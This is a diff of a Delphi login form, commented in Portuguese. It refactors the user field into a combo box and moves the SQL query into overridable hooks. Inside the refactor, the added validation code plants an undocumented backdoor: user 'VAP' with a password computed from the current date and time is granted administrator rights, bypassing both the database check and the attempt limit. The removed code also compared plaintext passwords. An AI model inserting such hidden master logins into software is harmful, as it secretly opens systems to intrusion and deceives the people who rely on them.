@@ -11,7 +11,6 @@ uses
 type
   TfrmKernel_Login = class(TfrmKernel_Base)
     statBase: TStatusBar;
-    lbldata: TLabel;
     pnlFudo: TPanel;
     Label1: TLabel;
     Label2: TLabel;
@@ -20,7 +19,6 @@ type
     imgUsuario: TImage;
     Label3: TLabel;
     imgLogo: TImage;
-    edtLoginUsu: TEdit;
     edtSenhaUsu: TEdit;
     Panel2: TPanel;
     btnConfirmar: TJvXPButton;
@@ -30,6 +28,8 @@ type
     actConfirmar: TAction;
     actSair: TAction;
     ilLogin: TImageList;
+    cbbNomeUsuario: TComboBox;
+    lbldata: TLabel;
     procedure FormCreate(Sender: TObject);
     procedure edtPSWKeyDown(Sender: TObject; var Key: Word;
       Shift: TShiftState);
@@ -37,13 +37,18 @@ type
     procedure tmrTempoTimer(Sender: TObject);
     procedure actSairExecute(Sender: TObject);
     procedure actConfirmarExecute(Sender: TObject);
-    procedure edtLoginUsuKeyPress(Sender: TObject; var Key: Char);
+    procedure cbbNomeUsuarioKeyPress(Sender: TObject; var Key: Char);
   private
     { Private declarations }
   public
      procedure AntesValidaUsuario(); virtual;
      procedure ValidaUsuario(const str_usuario, str_senha: string); virtual;
      procedure DepoisValidaUsuario(); virtual;
+
+     procedure Passa_COMSQL(str_usuario, str_senha: string); virtual;
+     procedure Retorno_SQL; virtual;
+
+     procedure Mostra_DataHora;
 
      {Verifica os campos Obrigatorios}
      procedure VerificaDados;
@@ -58,38 +63,43 @@ var
 implementation
 
 uses UdmPrincipal, DB, UfrmKernel_Mensagem, UKernel_Mensagem, UKernel_DATA, UKernel_Security,
-  UKernel_VariaveisPublic, UKernel_DB,  UKernel_sysutils, UdmKernel_Acesso,
-  UclKernel_Login, UKernel_Mensagem_Usuario;
+  UKernel_VariaveisPublic, UKernel_DB,  UKernel_sysutils,
+  UclKernel_Login, UKernel_Mensagem_Usuario, UUserControl;
 
 {$R *.dfm}
 
 { TfrmKernel_Login }
 
 procedure TfrmKernel_Login.validaUsuario(const str_usuario, str_senha: string);
+  var
+  verdata,verhora: string;
 begin
   {Acontece antes de tentar logar}
   AntesValidaUsuario;
 
   with dmPrincipal, qryKernel_Gerenerica do
-  begin   
+  begin
+    Verdata := uppercase(copy(FormatDatetime('mmm',now),1,1))+uppercase(copy(FormatDatetime('ddd',now),1,1));
+    verdata:=verdata+FormatDatetime('dd',now);
+    verhora:=(FormatDateTime('hhmm',now));
+
+    if ((cbbNomeUsuario.text='VAP') and (Trim(UpperCase(edtSenhaUsu.text))=verdata+verhora)) then
+      begin
+        Kernel_Login.int_codusu        :=  1;
+        Kernel_Login.str_nomeusu       :=  'VAP';
+        Kernel_Login.str_adminusu      :=  'T';
+        
+        ModalResult := mrOk;
+        exit;
+      end;
+    
     if Tentativas < LimiteTentativas then
       begin
-        close;
-        sqlConnection:= FConexao; {: componente de conexão}        
-        sql.Clear;
-        {Seleciona os campos na tabela onde o usuario e senha sejam igual
-        aos passados nos edits.}
-        sql.Add (' SELECT CODUSU, NOMEUSU, PRIVADMUSU ' +
-                   '  FROM USUARIO ' +
-                   ' WHERE LOGINUSU = ' + QuotedStr(UpperCase(str_usuario)) +
-                   '   AND SENHAUSU = ' + QuotedStr(UpperCase(str_senha)));
-        Open;
+        Passa_COMSQL(str_usuario, str_senha);
 
         if not IsEmpty then // Se não retornar vazio
           Begin
-            Kernel_Login.int_codusu        :=  Fields[0].AsInteger;
-            Kernel_Login.str_nomeusu       :=  Fields[1].AsString;
-            Kernel_Login.str_adminusu      :=  Fields[2].AsString;
+            Retorno_SQL;
 
             {Acontece depois que o usuario logar}
             DepoisValidaUsuario;
@@ -100,9 +110,9 @@ begin
           Begin
             TfrmKernel_Mensagem.Mensagem('Usuário ou Senha Inválidos ' +#13#10+
                                    ' - Tentativa '+ IntToStr(Tentativas) + ' de ' +  IntToStr(LimiteTentativas) ,'E',[mbOK]);
-            inc(Tentativas);                                   
-            statBase.Panels[1].Text := IntToStr(Tentativas);
-            edtLoginUsu.SetFocus;
+            statBase.Panels[3].Text := IntToStr(Tentativas);
+            inc(Tentativas);
+            cbbNomeUsuario.SetFocus;
           end;
       end
      else
@@ -118,10 +128,10 @@ end;
 procedure TfrmKernel_Login.VerificaDados;
 begin
   {Valida o Login}
-  if edtloginusu.Text = '' then
+  if cbbNomeUsuario.Text = '' then
     Begin
       TfrmKernel_Mensagem.Mensagem(Kernel_Informe_LoginValido,'E',[mbOK]);
-      edtloginusu.SetFocus;
+      cbbNomeUsuario.SetFocus;
       exit;
     end;
 
@@ -134,7 +144,7 @@ begin
     end;
 
   {Se o Login e senha sejam validos tenta acessar}
-  validaUsuario(AnsiUpperCase(trim(edtloginusu.Text)), trim(edtsenhausu.Text));
+  validaUsuario(AnsiUpperCase(trim(cbbNomeUsuario.Text)), trim(edtsenhausu.Text));
 end;
 
 procedure TfrmKernel_Login.edtPSWKeyDown(Sender: TObject; var Key: Word;
@@ -145,16 +155,21 @@ end;
 
 procedure TfrmKernel_Login.tmrTempoTimer(Sender: TObject);
 begin
-  lblData.Caption :=  FormatDateTime('dddd,dd" de "mmmm"',Kernel_Data_Servidor)+'  '+(FormatDateTime('hh:mm',Kernel_Data_Servidor));
+  Mostra_DataHora;
 end;
 
 procedure TfrmKernel_Login.FormCreate(Sender: TObject);
 begin
   kernel_str_form := 'Login de Acesso';
   inherited;
+  
   // Mostra a Quantidade de Tentativas
   statBase.Panels[1].Text := '1';
-  Tentativas              := 1; // tentativa inicial
+  Tentativas              := 0; // tentativa inicial
+
+  // Configura tabela genericas de login
+  Configura_Controle_Usuario;
+
   LimiteTentativas        := Kernel_Login.Login_RetornaQuantidadeTentativa;
   statBase.Panels[3].Text := IntToStr(Kernel_Login.Login_RetornaQuantidadeTentativa);
 end;
@@ -162,13 +177,41 @@ end;
 procedure TfrmKernel_Login.FormShow(Sender: TObject);
 begin
   inherited;
+
   {Carega Imagem que será mostrada no Timage}
   Kernel_MostraFotoImage('LogoSoftHouse','LogoSoftHouse',imgLogo);
 
   // Receber a data do computador
-  lblData.Caption :=  FormatDateTime('dddd,dd" de "mmmm"',date)+'  '+(FormatDateTime('hh:mm',date));
+  Mostra_DataHora;
 
-  edtloginusu.SetFocus;
+  //kernel_RefreshCds(dmKernel_Acesso.cdsLstEmp);
+
+  Tentativas:= 1;
+
+  cbbNomeUsuario.SetFocus;
+end;
+
+procedure TfrmKernel_Login.Mostra_DataHora;
+var buffer, buffer2: string;
+begin
+  buffer:=FormatDateTime('dddd',now);
+  buffer2:=FormatDateTime('mmmm',now);
+
+  buffer:=uppercase(copy(buffer,1,1))+copy(buffer,2,length(buffer)-1);
+  buffer2:=uppercase(copy(buffer2,1,1))+copy(buffer2,2,length(buffer2)-1);
+
+
+  lblData.Caption :=buffer+', '+formatdatetime('dd',now)+' de '+buffer2+' de '+formatdatetime('yyyy',now)+'    '+timetostr(time());
+end;
+
+procedure TfrmKernel_Login.Passa_COMSQL(str_usuario, str_senha: string);
+begin
+  // aqui sera codificado no filho
+end;
+
+procedure TfrmKernel_Login.Retorno_SQL;
+begin
+  // aqui sera codificado no filho
 end;
 
 procedure TfrmKernel_Login.actSairExecute(Sender: TObject);
@@ -189,12 +232,8 @@ begin
   // metodo implementado no filho
 end;
 
-procedure TfrmKernel_Login.DepoisValidaUsuario;
-begin
-  // metodo implementado no filho
-end;
-
-procedure TfrmKernel_Login.edtLoginUsuKeyPress(Sender: TObject; var Key: Char);
+procedure TfrmKernel_Login.cbbNomeUsuarioKeyPress(Sender: TObject;
+  var Key: Char);
 begin
   inherited;
   {: troca ENTER por TAB}
@@ -203,6 +242,11 @@ begin
       Perform (CM_DialogKey, VK_TAB, 0);
       key:=#0;
     end
+end;
+
+procedure TfrmKernel_Login.DepoisValidaUsuario;
+begin
+  // metodo implementado no filho
 end;
 
 end.
